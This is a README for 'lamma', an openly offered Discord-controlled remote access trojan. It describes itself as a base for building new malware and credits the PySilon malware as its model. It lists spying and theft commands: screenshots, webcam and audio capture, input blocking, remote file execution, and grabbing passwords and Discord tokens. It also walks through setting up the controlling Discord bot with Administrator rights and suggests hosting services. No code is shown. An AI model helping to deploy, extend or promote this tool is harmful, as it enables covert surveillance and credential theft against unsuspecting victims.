# lamma

A opensource discord rat made by `@yeaiusearchlinux`, made with the intention of making a structure for new malware. 

show some love `guns.lol/x5u`

## Features
- Take screenshots (`.ss`)
- Record audio (`.record`, `.stop`, `.play`)
- Block/unblock keyboard and mouse input (`.blockinput`, `.unblockinput`)
- Execute files (`.execute`)
- Grab passwords (`.grabpasswords`)
- Take webcam picture (`.webcam`)
- List and kill applications (`.listapps`) (`.kill ___`)
- Upload files to computer - up to 8mb (`.upload __`)
- Run files with path (`.run __`)
- Delete rat off computer (`.implode`)
- Extensively grab discord Tokens. Working with almost every browers and exe of discord. (`.grabdiscordtokens`)
- Dynamic channel creation for multiple computers

## Hosting and Referencing

Recommended to host on platforms like `heroku.com`, `replit.com` or `pythonanywhere.com`

This was made with references and exemplar to the popular Pysilion-malware
`https://github.com/mategol/PySilon-malware` 

# Setup - Discord bot
- Create discord bot using the discord dev portal 
- `https://discord.com/developers/applications`
- create an application
- Navigate to the Bot settings
- `https://discord.com/developers/applications/BOTID/bot`
- reset your token, and input it in `bot.py`
- make sure you check `presence intent`, `server members intent`. `message content intent` and also check the `Administrator` box
- Navigate to the OAuth2 settings
- `https://discord.com/developers/applications/BOTID/oauth2`
- Navigate to the `OAuth2 URL Generator` and check the `Bot` setting
- And the `Administrator` setting, and use your `Generated url`
- Now create a server and invite the bot to it.

## much love :)
